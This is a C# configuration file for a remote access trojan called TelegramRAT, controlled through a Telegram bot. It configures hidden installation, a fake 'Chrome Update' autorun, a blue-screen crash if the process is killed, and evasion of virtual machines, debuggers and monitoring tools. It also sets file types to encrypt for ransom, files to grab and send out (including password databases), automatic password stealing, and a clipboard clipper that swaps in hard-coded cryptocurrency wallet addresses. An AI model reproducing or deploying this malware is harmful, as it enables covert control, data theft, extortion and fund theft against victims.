namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = ""; // bot-token
        public const string TelegramChatID = ""; // chat-id
        public static int TelegramCommandCheckDelay = 1;

        //Support
        public const string SupportBTCWallet = "";
        public const string SupportXMRWallet = "";
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = false; // true
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\TroLex\MSpng.exe";
        // Add to startup.
        public static bool AutorunEnabled = false; // Please don't turn this on if you're just testing without knowledge how to remove it.
        public static string AutorunName = "Chrome Update"; // AutoRun name in Task Schedular
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = false; // Please don't turn this on if you're just testing without knowledge how to remove it.
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Hyper-V, Debuggers.
        public static bool PreventStartOnVirtualMachine = true;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain", "processhacker2", "glasswire"
        };
	    public static string[] SocialMediaNetworkList = {
	        "facebook", 
            "twitter", "vk", "vkontakte", 
            "youtube", "telegram", "wire", 
            "wickr", "linkedin"
	    }; 
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk",
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml", "mp3", "mp4"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456; // 6.291456 MB ( Megabytes )
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = true;
        // Your wallet addresses
        public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
        public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
        public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
    }
}
